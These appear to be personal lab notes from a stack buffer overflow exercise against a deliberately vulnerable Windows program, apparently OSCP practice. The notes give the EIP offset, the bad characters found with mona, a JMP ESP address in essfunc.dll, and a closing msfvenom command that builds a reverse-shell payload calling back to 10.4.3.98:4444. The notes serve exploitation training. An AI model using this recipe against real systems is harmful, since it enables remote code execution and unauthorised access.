### EIP
1100bytes

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1500

!mona findmsp -distance 1500

offset 1034

BBBB verified 

### Bad chars
##### Round 1
!mona bytearray -b "\x00"

ESP 0189FA30

!mona compare -f C:\mona\oscp\bytearray.bin -a 0189FA30

00 08 09 2c 2d ad ae

##### Round 2
\x00\x08\x2c\xad

!mona bytearray -b "\x00\x08\x2c\xad"

0022FF8C

!mona compare -f C:\mona\oscp\bytearray.bin -a 0022FF8C

00 01 08 2c ad

### JMP ESP
!mona jmp -r esp -cpb "\x00\x08\x2c\xad"

Log data, item 11
 Address=625011AF
 Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)

\xaf\x11\x50\x62

### Payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.4.3.98 LPORT=4444 EXITFUNC=thread -b "\x00\x08\x2c\xad" -f c